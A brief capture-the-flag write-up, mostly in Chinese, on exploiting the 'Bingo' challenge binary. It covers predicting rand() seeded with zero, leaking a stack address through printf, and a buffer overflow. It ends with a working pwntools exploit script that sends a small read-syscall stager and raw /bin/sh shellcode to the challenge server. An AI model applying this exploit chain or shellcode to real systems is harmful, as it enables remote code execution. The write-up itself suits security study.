## Bingo (200)
Credits to my teammates.

### solution
##### simulation
由於srand(0)，rand()是predictable的，所以用script模擬可以知道正確號碼。

##### information leak
因為輸入存在STACK上，而printf是用%s，所以最後一個數字輸入AAAA會leak出rbp，得到STACK ADDRESS

##### buffer overflow
贏BINGO後，可以輸入訊息，會buffer overflow，但只能蓋到ret address，但是由於這題沒有NX，可以輸入SHELLCODE，但是SHELLCODE也只有12個BYTE的位置。經果觀察，發現執行到RET時的REGISTER，剛好適合呼叫SYSCALL READ。所以只要RET回STACK上，執行SHELL CODE，更改RDX，就可以執行第二次輸入，把整個SHELLCODE送進程式。

### script
```python
from pwn import *

import ctypes

#r = process("./Bingo")
r = remote('35.201.132.60' ,12001)

r.recvuntil('numbers:')
LIBC = ctypes.cdll.LoadLibrary('./libc_64.so.6')
LIBC.srand(0)
for i in range(15):
	r.sendline(str(LIBC.rand()%200))
r.send('bbbb')
r.recvuntil('b'*4)
st = u64(r.recvuntil(' ')[:-1].ljust(8,'\x00'))
print hex(st)
r.recvuntil('others:')
tar = st - 0x14
ass = asm("mov rdx,0xfffffff;syscall;ret;",arch="amd64")
print ass 
#r.interactive()
r.send(ass+'aa'+p64(tar)[0:7])
#r.sendline('a'*40)
shell = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendline('aa'+p64(st+8)+shell)
r.interactive()
```
